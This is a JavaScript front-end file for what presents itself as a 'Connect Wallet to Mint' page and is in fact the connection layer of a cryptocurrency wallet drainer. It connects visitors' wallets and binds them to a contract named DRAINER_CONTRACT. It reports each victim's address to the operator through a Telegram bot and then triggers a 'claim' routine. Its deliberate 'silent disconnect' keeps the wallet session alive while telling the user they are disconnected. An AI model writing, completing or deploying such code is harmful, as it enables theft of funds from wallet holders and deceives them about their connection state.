import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  // ==========================================================================
  //  CONFIG SHORTCUTS
  // ==========================================================================
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID = 1,
  } = CONFIG;

  const PRIMARY_PROJECT_ID = PROJECT_ID;
  const FALLBACK_PROJECT_ID = PUBLIC_TEST_ID;

  const RELAY_URLS = [
    'wss://relay.walletconnect.com',
    'wss://relay.walletconnect.org',
  ];

  // ==========================================================================
  //  PLATFORM DETECTION
  // ==========================================================================
  const UA = navigator.userAgent || '';
  const isMobileDevice  = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(UA);
  const isIOSDevice     = /iPhone|iPad|iPod/i.test(UA);
  const isAndroidDevice = /Android/i.test(UA);
  const isDesktopDevice = !isMobileDevice;

  function getPlatform() {
    if (isIOSDevice)     return 'ios';
    if (isAndroidDevice) return 'android';
    if (/Windows/i.test(UA))  return 'windows';
    if (/Macintosh|Mac OS X/i.test(UA)) return 'mac';
    return 'unknown';
  }

  // ==========================================================================
  //  DEBUG PANEL
  // ==========================================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    const ts = new Date().toLocaleTimeString();
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${ts}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ==========================================================================
  //  IN-WALLET BROWSER DETECTION
  // ==========================================================================
  function detectInWalletBrowser() {
    const eth = window.ethereum;
    if (eth?.isMetaMask && /MetaMaskMobile/i.test(UA))       return { wallet: 'metamask', name: 'MetaMask' };
    if (eth?.isTrust || /TrustWallet/i.test(UA))             return { wallet: 'trust',    name: 'Trust Wallet' };
    if (eth?.isCoinbaseWallet || /CoinbaseWallet/i.test(UA)) return { wallet: 'coinbase', name: 'Coinbase Wallet' };
    if (/Rainbow/i.test(UA) && eth)                          return { wallet: 'rainbow',  name: 'Rainbow' };
    if (eth && isMobileDevice)                               return { wallet: 'injected', name: 'Wallet' };
    return null;
  }

  // ==========================================================================
  //  TELEGRAM
  // ==========================================================================
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;

  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      if (!r.ok) { console.error('[main.js] Telegram error:', await r.text()); return false; }
      return true;
    } catch (e) {
      console.error('[main.js] Telegram exception:', e);
      return false;
    }
  }
  window.testTelegram = (m) => sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  // ==========================================================================
  //  LIBRARY LOADING
  // ==========================================================================
  function withTimeout(promise, ms, label) {
    return Promise.race([
      promise,
      new Promise((_, reject) => setTimeout(() => reject(new Error(`Timeout: ${label} (${ms}ms)`)), ms)),
    ]);
  }

  async function tryImport(urls, pickFn, label, timeoutMs = 8000) {
    let lastErr = null;
    for (const url of urls) {
      try {
        const t0 = performance.now();
        const m = await withTimeout(import(url), timeoutMs, `${label} @ ${url}`);
        const v = pickFn(m);
        if (!v) throw new Error(`${label} export not found at ${url}`);
        logDebug(`✅ ${label} from ${url} (${(performance.now() - t0).toFixed(0)}ms)`);
        return v;
      } catch (e) {
        lastErr = e;
        logDebug(`❌ ${label} fail @ ${url}: ${e.message}`);
      }
    }
    throw lastErr || new Error(`${label} failed on all CDNs`);
  }

  async function loadWalletConnectLibraries() {
    const signCdn = [
      'https://esm.sh/@walletconnect/sign-client@2.11.0?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
    ];
    const providerCdn = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
    ];

    const [SignClient, EthereumProvider] = await Promise.all([
      tryImport(signCdn,     (m) => m.default || m,                       'SignClient'),
      tryImport(providerCdn, (m) => m.EthereumProvider || m.default || m, 'EthereumProvider'),
    ]);

    return { SignClient, EthereumProvider };
  }

  // ==========================================================================
  //  RELAY REACHABILITY
  // ==========================================================================
  async function pickRelayUrl(timeoutMs = 2500) {
    for (const url of RELAY_URLS) {
      try {
        const ok = await withTimeout(
          new Promise((resolve) => {
            const ws = new WebSocket(url);
            const t = setTimeout(() => { try { ws.close(); } catch {} resolve(false); }, timeoutMs);
            ws.onopen  = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(true); };
            ws.onerror = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(false); };
          }),
          timeoutMs + 500,
          `ws-probe ${url}`
        );
        if (ok) { logDebug(`🌐 Relay OK: ${url}`); return url; }
      } catch (e) { /* try next */ }
    }
    logDebug('⚠️ No relay reachable — using primary anyway');
    return RELAY_URLS[0];
  }

  // ==========================================================================
  //  DOM REFERENCES
  // ==========================================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  // ==========================================================================
  //  MODULE STATE
  // ==========================================================================
  let SignClient = null;
  let EthereumProvider = null;

  let wcProvider = null;              // THE single source of truth for WC
  let currentSession = null;          // last known session (from provider.session)
  let activeProvider = null;          // EIP-1193 provider currently in use
  let web3Instance = null;
  let contractInstance = null;
  let isConnecting = false;
  let wcInitPromise = null;           // dedupe init calls

  // ==========================================================================
  //  BUTTON UI
  // ==========================================================================
  function setButtonState(button, state) {
    if (!button) return;
    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.minWidth     = '180px';
    button.disabled           = state === 'loading';
    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = msg;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ==========================================================================
  //  LOCAL STORAGE
  //  NOTE: We only save the address + a "was connected" flag. The WC
  //  provider stores its own session in localStorage under its own key.
  // ==========================================================================
  function saveWallet(address, chainType = 'evm') {
    localStorage.setItem('connectedWallet', address);
    localStorage.setItem('chainType', chainType);
  }
  function getSavedWallet()    { return localStorage.getItem('connectedWallet'); }
  function getSavedChainType() { return localStorage.getItem('chainType') || 'unknown'; }
  function clearSavedWallet() {
    localStorage.removeItem('connectedWallet');
    localStorage.removeItem('chainType');
  }

  // ==========================================================================
  //  PUBLISH GLOBAL STATE
  // ==========================================================================
  function publishGlobalState(address, chain, provider = null) {
    const live = provider || activeProvider || web3Instance?.currentProvider || window.ethereum || null;
    window.__apexConnected = {
      address,
      chain,
      web3: web3Instance,
      contract: contractInstance,
      provider: live,
      session: currentSession,
      publishedAt: Date.now(),
    };
    logDebug(`published global: addr=${address} chain=${chain} hasWeb3=${!!web3Instance} hasProvider=${!!live}`);
    window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
  }

  // ==========================================================================
  //  CONNECTED UI
  // ==========================================================================
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      connectButton.parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;
    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobileDevice ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    currentSession = null;
    window.__apexConnected = null;
  }

  // ==========================================================================
  //  EIP-6963 PROVIDER DISCOVERY
  // ==========================================================================
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;
    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });
    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
  }

  // ==========================================================================
  //  WALLET PICKER
  // ==========================================================================
  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
      position:fixed;inset:0;background:rgba(0,0,0,0.7);
      display:flex;align-items:center;justify-content:center;z-index:99999;
    `;
    const modalEl = document.createElement('div');
    modalEl.style.cssText = `
      background:#1F2937;padding:24px;border-radius:16px;
      max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;
    `;
    modalEl.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
    `;
    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);
    const list = modalEl.querySelector('#wl');
    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `
        background:#374151;border:none;padding:12px;border-radius:8px;
        color:white;font-size:16px;cursor:pointer;text-align:left;
        display:flex;gap:10px;align-items:center;
      `;
      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px'; i.style.height = '24px';
        b.prepend(i);
      }
      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });
    modalEl.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  // ==========================================================================
  //  WALLETCONNECT PROVIDER — the CORRECT way
  //  EthereumProvider owns the SignClient and the session storage.
  //  We do NOT feed it a foreign session object from a separate SignClient.
  // ==========================================================================
  async function initWalletConnectProvider({ useFallbackId = false, timeoutMs = 12000 } = {}) {
    if (wcProvider) return wcProvider;
    if (wcInitPromise) return wcInitPromise;

    const projectId = useFallbackId ? FALLBACK_PROJECT_ID : PRIMARY_PROJECT_ID;
    if (!projectId) {
      logDebug('❌ No projectId configured');
      return null;
    }

    const relayUrl = await pickRelayUrl();
    const chains = [MAINNET_ID];

    wcInitPromise = (async () => {
      try {
        logDebug(`WC init: projectId=${projectId.slice(0,8)}… relay=${relayUrl} chain=${MAINNET_ID}`);
        const t0 = performance.now();

        const provider = await withTimeout(
          EthereumProvider.init({
            projectId,
            chains,
            showQrModal: false,                    // we render our own UI trigger; but we let provider show its own modal via connect()
            metadata: DAPP_METADATA,
            relayUrl,
            // Optional but recommended — this enables chain switching later.
            optionalChains: chains,
          }),
          timeoutMs,
          'EthereumProvider.init'
        );

        // Wire up lifecycle events BEFORE any connect call.
        wireWCEvents(provider);

        wcProvider = provider;
        currentSession = provider.session || null;

        logDebug(`✅ WC provider OK in ${(performance.now() - t0).toFixed(0)}ms — session=${!!currentSession}`);
        return provider;
      } catch (e) {
        logDebug('WC provider init failed: ' + e.message);
        wcProvider = null;
        return null;
      } finally {
        wcInitPromise = null;
      }
    })();

    return wcInitPromise;
  }

  // ==========================================================================
  //  WC LIFECYCLE EVENTS — attached once to the provider
  // ==========================================================================
  let wcEventsWired = false;
  function wireWCEvents(provider) {
    if (!provider || wcEventsWired || !provider.on) return;
    wcEventsWired = true;

    provider.on('accountsChanged', (accounts) => {
      logDebug(`WC accountsChanged: ${JSON.stringify(accounts)}`);
      if (!accounts || accounts.length === 0) return;
      const a = accounts[0];
      updateConnectedUI(a, 'evm');
      saveWallet(a, 'evm');
      publishGlobalState(a, 'evm', provider);
    });

    provider.on('chainChanged', (id) => {
      logDebug(`WC chainChanged: ${id}`);
      showStatus(`Network changed to ${id}`, 'info');
      const a = window.__apexConnected?.address || getSavedWallet();
      if (a) {
        if (web3Instance) contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        publishGlobalState(a, 'evm', provider);
      }
    });

    provider.on('session_delete', () => {
      logDebug('WC session_delete');
      resetConnectedUI();
      clearSavedWallet();
    });

    provider.on('session_update', ({ params }) => {
      const accts = params?.namespaces?.eip155?.accounts;
      if (accts?.length) {
        const a = accts[0].split(':')[2];
        currentSession = provider.session || null;
        updateConnectedUI(a, 'evm');
        saveWallet(a, 'evm');
        publishGlobalState(a, 'evm', provider);
      }
    });

    provider.on('disconnect', () => {
      logDebug('WC disconnect event');
      resetConnectedUI();
      clearSavedWallet();
    });
  }

  // ==========================================================================
  //  INJECTED EVM CONNECT (desktop primary, mobile in-wallet browser)
  // ==========================================================================
  async function connectDirectEVM(timeoutMs = 8000) {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 600));

    const inWallet = detectInWalletBrowser();
    let providers = evmProviders.filter((p) => p.provider);

    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: inWallet?.name || 'Injected', rdns: 'io.injected' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) return false;

    let chosen = null;
    if (inWallet && window.ethereum) {
      chosen = { info: { name: inWallet.name }, provider: window.ethereum };
    } else if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find((p) =>
        p.info.rdns === 'io.metamask' || p.info.name.toLowerCase().includes('metamask')
      );
      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return false;
    }

    try {
      const provider = chosen.provider;
      const accounts = await withTimeout(
        provider.request({ method: 'eth_requestAccounts' }),
        timeoutMs,
        'eth_requestAccounts'
      );
      if (!accounts?.length) return false;

      const address = accounts[0];
      saveWallet(address, 'evm');
      setupEVMProviderEvents(provider);

      const Web3 = (await import('web3')).default;
      web3Instance = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      activeProvider = provider;

      updateConnectedUI(address, 'evm');
      logDebug(`✅ Injected connected: ${address} (${chosen.info.name})`);
      return true;
    } catch (e) {
      logDebug('Injected error: ' + e.message);
      return false;
    }
  }

  // ==========================================================================
  //  WALLETCONNECT CONNECT
  //  Uses wcProvider.connect() — which internally handles SignClient session
  //  creation AND the session binding so provider.request() actually works.
  // ==========================================================================
  async function connectViaWalletConnect({ useFallbackId = false, timeoutMs = 300000 } = {}) {
    const provider = await initWalletConnectProvider({ useFallbackId });
    if (!provider) {
      logDebug('WC unavailable after init attempt');
      return false;
    }

    try {
      // If a stale session already exists, we consider ourselves connected.
      if (provider.session) {
        const accts = provider.session.namespaces?.eip155?.accounts || [];
        if (accts.length) {
          const address = accts[0].split(':')[2];
          currentSession = provider.session;
          const Web3 = (await import('web3')).default;
          web3Instance = new Web3(provider);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          activeProvider = provider;
          saveWallet(address, 'evm');
          updateConnectedUI(address, 'evm');
          return true;
        }
      }

      showStatus('Opening wallet options...', 'info');

      // connect() handles the modal + approval handshake internally.
      await withTimeout(
        provider.connect({
          chains: [MAINNET_ID],
          optionalChains: [MAINNET_ID],
        }),
        timeoutMs,
        'WC connect/approval'
      );

      const accounts = provider.accounts || [];
      if (!accounts.length) throw new Error('No accounts returned after connect');

      const address = accounts[0];
      currentSession = provider.session || null;

      const Web3 = (await import('web3')).default;
      web3Instance = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      activeProvider = provider;

      saveWallet(address, 'evm');
      updateConnectedUI(address, 'evm');
      logDebug(`✅ WC connected: ${address}`);
      return true;
    } catch (e) {
      logDebug('WC connect error: ' + e.message);
      // Clean up any half-open modal.
      try { if (provider?.modal?.closeModal) provider.modal.closeModal(); } catch {}
      return false;
    }
  }

  // ==========================================================================
  //  INJECTED PROVIDER LIFECYCLE EVENTS
  // ==========================================================================
  function setupEVMProviderEvents(provider) {
    if (!provider || !provider.on) return;

    provider.on('accountsChanged', (accounts) => {
      if (!accounts || accounts.length === 0) {
        // For injected, empty accounts means real disconnect.
        resetConnectedUI();
        clearSavedWallet();
      } else {
        const a = accounts[0];
        updateConnectedUI(a, 'evm');
        saveWallet(a, 'evm');
        publishGlobalState(a, 'evm', provider);
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess();
          }
        }, 1000);
      }
    });

    provider.on('chainChanged', (id) => {
      showStatus(`Network changed to ${id}`, 'info');
      try {
        const a = window.__apexConnected?.address || getSavedWallet();
        if (a) {
          if (web3Instance) contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          publishGlobalState(a, 'evm', provider);
        }
      } catch {}
    });

    provider.on('disconnect', () => {
      resetConnectedUI();
      clearSavedWallet();
    });
  }

  // ==========================================================================
  //  CONNECT DISPATCHER
  // ==========================================================================
  async function connectWallet() {
    if (isConnecting) return;
    isConnecting = true;

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting...', 'info');

    let success = false;

    try {
      if (isDesktopDevice) {
        success = await connectDirectEVM(8000);
        if (!success) success = await connectViaWalletConnect({ useFallbackId: false, timeoutMs: 300000 });
        if (!success) success = await connectViaWalletConnect({ useFallbackId: true,  timeoutMs: 300000 });
      } else {
        const inWallet = detectInWalletBrowser();
        const strongInWallet = inWallet && inWallet.wallet !== 'injected';

        if (strongInWallet) {
          logDebug(`📱 In-wallet browser: ${inWallet.name}`);
          success = await connectDirectEVM(8000);
        }
        if (!success) success = await connectViaWalletConnect({ useFallbackId: false, timeoutMs: 300000 });
        if (!success) success = await connectViaWalletConnect({ useFallbackId: true,  timeoutMs: 300000 });
      }
    } finally {
      isConnecting = false;
    }

    if (success) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 1200);
    } else {
      showStatus('No wallet found', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  // ==========================================================================
  //  DISCONNECT — silent
  //  Per your requirement: the wallet's underlying session MUST stay alive.
  //  We only clear local UI + localStorage. We do NOT call provider.disconnect()
  //  and we do NOT call provider.modal?.closeModal() with a disconnect request.
  // ==========================================================================
  async function disconnectWallet() {
    try {
      // Intentionally NOT calling wcProvider.disconnect() — session stays alive.
      // Intentionally NOT calling client.disconnect() — no SignClient in use.
      logDebug('🔌 Silent local disconnect (wallet session preserved)');
    } catch {}

    resetConnectedUI();
    clearSavedWallet();
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    // Keep currentSession reference so a subsequent reconnect can reuse it if needed.
  }

  // ==========================================================================
  //  BUTTON WIRING
  // ==========================================================================
  const handleClick = async () => {
    const saved = getSavedWallet();
    const hasSession = !!currentSession || !!wcProvider?.session || getSavedChainType() !== 'unknown';
    if (saved && hasSession) await disconnectWallet();
    else await connectWallet();
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  if (walletButton && isMobileDevice) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => {
        if (connectButton) connectButton.scrollIntoView({ behavior: 'smooth', block: 'center' });
      }, 300);
    });
  }

  // ==========================================================================
  //  SESSION RESTORE — via EthereumProvider's own storage
  // ==========================================================================
  async function restoreWalletConnection() {
    const savedWallet  = getSavedWallet();
    const savedChain   = getSavedChainType();
    if (!savedWallet || savedChain !== 'evm') return;

    // 1) WC restore — provider reads its own localStorage session.
    if (!isMobileDevice || isMobileDevice) {
      const provider = await initWalletConnectProvider({ useFallbackId: false });
      if (provider && provider.session) {
        try {
          const accts = provider.session.namespaces?.eip155?.accounts || [];
          if (accts.length) {
            const account = accts[0].split(':')[2];
            currentSession = provider.session;
            const Web3 = (await import('web3')).default;
            web3Instance = new Web3(provider);
            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            activeProvider = provider;
            updateConnectedUI(account, 'evm');
            logDebug('♻️ WC session restored');
            return;
          }
        } catch (e) { logDebug('WC restore: ' + e.message); }
      }
    }

    // 2) Injected restore (desktop only)
    if (isDesktopDevice && window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0 && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
          const Web3 = (await import('web3')).default;
          web3Instance = new Web3(window.ethereum);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          activeProvider = window.ethereum;
          updateConnectedUI(savedWallet, 'evm');
          setupEVMProviderEvents(window.ethereum);
          logDebug('♻️ Injected session restored');
          return;
        }
      } catch {}
    }

    // Nothing restored → clear stale flag so button starts fresh.
    clearSavedWallet();
  }

  // ==========================================================================
  //  BOOT
  // ==========================================================================
  try {
    const [libs] = await Promise.all([
      loadWalletConnectLibraries(),
      pickRelayUrl().catch(() => RELAY_URLS[0]),
    ]);
    SignClient       = libs.SignClient;
    EthereumProvider = libs.EthereumProvider;
    logDebug('✅ All libraries loaded');

    setupEIP6963();

    if (isMobileDevice) {
      logDebug('📱 Pre-warming WalletConnect on mobile…');
      await initWalletConnectProvider({ useFallbackId: false }).catch(() => {});
    }

    await restoreWalletConnection();
  } catch (err) {
    logDebug('Fatal: ' + err.message);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  // ==========================================================================
  //  GLOBAL WALLETCONNECT EVENTS (SignClient side, informational only)
  //  The EthereumProvider already handles lifecycle — this is just extra
  //  logging / belt-and-braces for cross-tab deletes.
  // ==========================================================================
  setTimeout(() => {
    if (!wcProvider) return;
    wcProvider.on('session_delete', () => {
      resetConnectedUI();
      clearSavedWallet();
    });
  }, 800);

  if (window.ethereum && isDesktopDevice) {
    setupEVMProviderEvents(window.ethereum);
  }

  window.addEventListener('beforeunload', () => {
    try { if (wcProvider?.modal?.closeModal) wcProvider.modal.closeModal(); } catch {}
  });

  logDebug(`✅ main.js ready — Platform: ${getPlatform()} | mobile=${isMobileDevice}`);
  console.log('✅ main.js ready — test with testTelegram("hi")');
})();
